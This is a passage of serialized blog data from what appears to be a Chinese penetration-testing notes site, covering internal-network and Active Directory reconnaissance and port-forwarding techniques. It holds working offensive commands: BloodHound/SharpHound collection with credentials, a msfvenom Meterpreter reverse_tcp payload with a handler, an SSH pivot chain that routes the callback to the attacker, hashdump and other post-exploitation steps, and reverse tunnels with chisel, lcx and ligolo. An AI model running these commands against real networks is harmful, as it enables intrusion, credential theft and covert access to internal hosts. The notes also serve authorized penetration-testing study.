class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.mysql_history&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.php_history&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;可写目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -writable -type d 2/dev/null      # 可写目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -perm -222 -type d 2/dev/null     # 可写目录 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -perm -o w -type d 2/dev/null     # 可写目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -perm -o x -type d 2/dev/null     # 可执行目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / \\( -perm -o w -perm -o x \\) -type d 2/dev/null   # 可写可执行目录&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;addomain\&quot;&gt;ADDomain&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#addomain\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取当前域： Get-ADDomain&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举其他域： Get-ADDomain -Identity &amp;#x3C;Domain&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取域 SID： Get-DomainSID&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取域控制器：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADDomainController&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADDomainController -Identity &amp;#x3C;DomainName&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域用户：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADUser -Filter * -Identity &amp;#x3C;user -Properties *&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域计算机：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADComputer -Filter * -Properties *&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADGroup -Filter * &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域信任：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADTrust -Filter *&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADTrust -Identity &amp;#x3C;DomainName&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域林信任：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADForest&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-ADForest -Identity &amp;#x3C;ForestName&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举本地 AppLocker 有效策略：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;bloodhoundad\&quot;&gt;BloodHoundAD&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#bloodhoundad\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;strong&gt;AzureHound&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;. .\\AzureHound.ps1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-AzureHound&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;BloodHound&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.\\SharpHound.exe -c all -d active.htb --searchforest&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;搜集不包括GPOLocalGroup的信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.\\SharpHound.exe -c all,GPOLocalGroup&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;只从DC手机信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.\\SharpHound.exe --CollectionMethod DCOnly&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.\\SharpHound.exe -c all --LdapUsername &amp;#x3C;UserName --LdapPassword &amp;#x3C;Password --JSONFolder &amp;#x3C;PathToFile&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.\\SharpHound.exe -c all --LdapUsername &amp;#x3C;UserName --LdapPassword &amp;#x3C;Password --domaincontroller 10.10.10.100 -d active.htb&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.\\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\\Windows\\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;或使用powershell&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-BloodHound -SearchForest -CSVFolder C:\\Users\\Public&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-BloodHound -CollectionMethod All  -LDAPUser &amp;#x3C;UserName -LDAPPass &amp;#x3C;Password -OutputDirectory &amp;#x3C;PathToFile&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;或远程使用BloodHound Python&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/fox-it/BloodHound.py&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;pip install bloodhound&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用 Certipy 收集更多用于证书利用的数据&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;certipy find &#39;corp.local/john:Passw0rd@dc.corp.local&#39; -bloodhound&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;然后将 zip/json 文件导入 Neo4J 数据库并进行查询。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;apt install bloodhound &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;启动BloodHound和数据库&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;neo4j console&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;或者使用docker&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./bloodhound --no-sandbox&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;访问http://127.0.0.1:7474  user:neo4J, pass:neo4j&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;windows安全标识符sid&quot;],&quot;text&quot;:[0,&quot;Windows安全标识符SID&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;临时http服务架设&quot;],&quot;text&quot;:[0,&quot;临时HTTP服务架设&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;cmd&quot;],&quot;text&quot;:[0,&quot;Cmd&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;wmi&quot;],&quot;text&quot;:[0,&quot;Wmi&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;wmi-1&quot;],&quot;text&quot;:[0,&quot;Wmi&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;powershell基础操作&quot;],&quot;text&quot;:[0,&quot;Powershell基础操作&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;powerview&quot;],&quot;text&quot;:[0,&quot;Powerview&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;linux&quot;],&quot;text&quot;:[0,&quot;Linux&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;addomain&quot;],&quot;text&quot;:[0,&quot;ADDomain&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;bloodhoundad&quot;],&quot;text&quot;:[0,&quot;BloodHoundAD&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;内网信息获取&quot;],&quot;date&quot;:[3,&quot;2026-01-23T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;内网信息&quot;],[0,&quot;信息收集&quot;],[0,&quot;命令&quot;]]],&quot;categories&quot;:[1,[[0,&quot;Penetration&quot;],[0,&quot;内网和域&quot;]]]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/29&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/内网和域/端口转发和映射&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;端口映射和转发&quot;],&quot;date&quot;:[3,&quot;2026-01-23T10:36:57.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;端口转发&quot;],[0,&quot;映射&quot;],[0,&quot;代理&quot;],[0,&quot;proxy&quot;]]],&quot;categories&quot;:[1,[[0,&quot;Penetration&quot;],[0,&quot;内网和域&quot;]]]}],&quot;body&quot;:[0,&quot;# iptables\n\n```\n需开启ip转发功能\n&gt;vim /etc/sysctl.conf设置net.ipv4.ip_forward=1\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/179.png) ![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/180.png)\n\n```\n本地端口22转发到2222上\n&gt;iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22\n内网98机器3389转到本机110的6789上\n&gt;iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389\n&gt;iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/181.png)\n\n```\n查看规则\n&gt;iptables -t nat -L\n删除规则\n&gt;iptables -t nat -D PREROUTING 1\n删除全部规则\n&gt;iptables -t nat –F\n```\n# lcx\n\n```\n使用条件：服务器通外网，拥有自己的公网ip\n靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389\nlinux攻击机：./portmap -m 2 -p1 9999 -p2 33889\nwindows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889\nPortTran\nhttps://github.com/k8gege/K8tools/raw/master/PortTran.rar\n攻击机执行\n&gt;PortTranS20.exe 12345 389\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/163.png)\n\n```\n靶机执行\n&gt;PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345\n建立连接后，攻击机连接本机389端口即可\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/164.png)\n# msf\n\n```\nMeterpreter 列出活动的端口转发\n&gt;portfwd list\n使用条件：服务器通外网，拥有自己的公网ip\n&gt;portfwd add -l 5555 -p 3389 -r 172.16.86.153\n转发目标主机的3389远程桌面服务端口到本地的5555\n删除转发\n&gt;portfwd delete –l 3389 –p 3389 –r target-host \n&gt;portfwd flush\n```\n# netsh\n\n```\n边界机器执行：\n&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22\n将内网10.1.1.108主机22端口转发至本机2222端口，攻击机连接边界机器2222端口即可访问内网SSH\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/176.png)\n\n```\n&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389\n当靶机某服务只允许内网访问时，将端口转发出来\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/177.png)\n\n```\n添加防火墙规则：\n&gt;netsh advfirewall firewall add rule name=\&quot;RDP\&quot; protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow\n列出所有转发规则:\n&gt;netsh interface portproxy show all\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/178.png)\n\n```\n删除指定的端口转发规则：\n&gt;netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98\n删除所有转发规则：\n&gt;netsh interface portproxy reset\n```\n# ssf\n\n**单层网络正向转发**\n\n```\nhttps://github.com/securesocketfunneling/ssf/releases\n内网机执行：\n&gt;ssfd.exe -p 1080\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/170.png)\n\n```\n边界机器执行\n&gt;ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98 \n把内网10.1.1.108的SSH转发出来\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/171.png)\n\n```\n边界机器访问内网端口\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/172.png)\n\n**单层网络反向转发**\n\n```\n边界机器执行：\n&gt;ssfd.exe -p 1080\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/173.png)\n\n```\n内网机器执行：\n&gt;ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/174.png) ![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/175.png)\n# ssh\n\n**SSH基本参数**\n\n```\n-C 压缩传输，加快传输速度\n-f 在后台对用户名密码进行认证\n-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行\n-q 安静模式，不要显示任何debug信息\n-l 指定ssh登录名\n-g 允许远程主机连接到本地用于转发的端口\n-L 进行本地端口转发\n-R 进行远程端口转发\n-D 动态转发，即socks代理\n-T 禁止分配伪终端\n-p 指定远程ssh服务端口\n```\n\n**正向转发**\n1. 方法一\n外网靶机110，内网靶机115\n本地攻击机编辑后restart ssh服务\n```\n#vim /etc/ssh/sshd_conf\nAllowTcpForwarding yes 允许TCP转发\nGatewayPorts yes   允许远程主机连接本地转发的端口\nTCPKeepAlive yes    TCP会话保持存活\nPasswordAuthentication yes  密码认证\n```\n本地攻击机执行，把115的3389映射到本地的33890上\n```\n&gt;ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22\n```\n2. 方法2（上线MSF）\n** 攻击机--出网Linux靶机--不出网Linux靶机--不出网win机 **\n攻击逻辑说明：\n* Windows 执行 1.exe\n* → 连接 “不出网 Linux:12138”\n*   ↓ （SSH 转发）\n* 不出网 Linux 把 12138 映射到 “出网 Linux:12138”\n*   ↓ （SSH 转发）\n*  出网 Linux 把 12138 映射到 “攻击机:12345”\n    ↓\n* 攻击机 msfconsole 收到 meterpreter 会话\n```\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe\n```\n攻击机监听端口12345\n```\nmsf6 &gt; use exploit/multi/handler\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set lport 12345\nmsf6 exploit(multi/handler) &gt; set ExitOnSession false\nmsf6 exploit(multi/handler) &gt; exploit -j\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 0.0.0.0:12345\n```\n不出网Linux机\n```\nssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22\n```\n这样就建立连接了，然后可以这样做\n```\n# 把会话放到后台\nmeterpreter &gt; background\n# 查看/升级 transport（断网重连）\nmsf6 &gt; sessions -i 1\nmeterpreter &gt; transport list\nmeterpreter &gt; transport add -t reverse_tcp -l 攻击机公网IP -p 443\nmeterpreter &gt; transport next\n# 常用其它命令\nmeterpreter &gt; sysinfo # 系统版本 / 补丁\t\nmeterpreter &gt; getuid # 当前用户 / 特权\t\nmeterpreter &gt; run post/windows/gather/enum_domain #域信息\t\nmeterpreter &gt; run post/windows/gather/enum_av 杀软 / 防火墙\t\nmeterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.0-3.0/24 # 网络段\t\nmeterpreter &gt; hashdump（需 SYSTEM） # 密码哈希（需SYSTEM）\nmeterpreter &gt; run post/windows/gather/enum_logged_on_users # 最近登录\t\n```\n\n**反向转发**\n\n外网攻击107，内网靶机97\n\n出网靶机编辑后restart ssh服务\n```\n#vim /etc/ssh/sshd_conf\nAllowTcpForwarding yes 允许TCP转发\nGatewayPorts yes   允许远程主机连接本地转发的端口\nTCPKeepAlive yes    TCP会话保持存活\nPasswordAuthentication yes  密码认证\n```\n边界靶机上执行，把内网靶机97的3389映射到公网VPS107的33809上\nssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22\nnetstat –tnlp\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/165.png)\n\n```\n转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)\n&gt;vim /etc/rinetd.conf\n添加0.0.0.0 3389 127.0.0.1 33890\n&gt;service rinetd start\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/166.png)\n\n```\n看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/167.png)\n\n# Invoke-SocksProxy\n\n```\nhttps://gitee.com/RichChigga/Invoke-SocksProxy\n&gt;Import-Module .\\Invoke-SocksProxy.psm1 \n&gt;Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/168.png) ![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/169.png)\n# Ligolo\n\n```\ncd `go env GOPATH`/src\n📢反引号 `...` 是 命令替换的意思，实际效果就是会返回go的环境变量路径拼接到后面使用。\n&gt;git clone https://github.com/sysdream/ligolo\n&gt;cd ligolo\n&gt;make dep\n生成证书,example.com换成攻击机的域名或IP地址\n&gt;make certs TLS_HOST=example.com\n\n&gt;make build-all\n\n靶机执行\n&gt;ligolo_windows_amd64.exe -relayserver 攻击机IP:5555\n攻击机执行\n&gt;./bin/localrelay_linux_amd64\n```\n以上场景适用于内网靶机可访问外网，但外网无法访问内网的情况，最后生成一个在攻击机上的11601 的socks5监听端口，实际生成效果和以下命令相似：\n```\nssh -CfNg -D 11601 root@靶机IP\n```\n区别是隧道搭建时是靶机连攻击机，ssh是攻击机连靶机\n# chisel\n\n工具下载链接：\nhttps://github.com/jpillora/chisel \n\n攻击机执行\n```\nchisel server -p 12138 –reverse\n```\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/182.png)\n靶机执行\n```\n&gt;chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389\n```\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/183.png)\n建立成功后，攻击机连接本机1234端口即可访问靶机3389\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/184.png)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/内网和域/端口转发和映射.md&quot;],&quot;digest&quot;:[0,&quot;1484ba373c9d8ff6&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;iptables\&quot;&gt;iptables&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#iptables\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;需开启ip转发功能&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;vim /etc/sysctl.conf设置net.ipv4.ip_forward=1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/179.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt; &lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/180.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;本地端口22转发到2222上&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;内网98机器3389转到本机110的6789上&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/181.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查看规则&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -L&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除规则&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -D PREROUTING 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除全部规则&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat –F&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;lcx\&quot;&gt;lcx&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#lcx\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用条件：服务器通外网，拥有自己的公网ip&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;linux攻击机：./portmap -m 2 -p1 9999 -p2 33889&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;windows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PortTran&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/k8gege/K8tools/raw/master/PortTran.rar&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;攻击机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;PortTranS20.exe 12345 389&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img 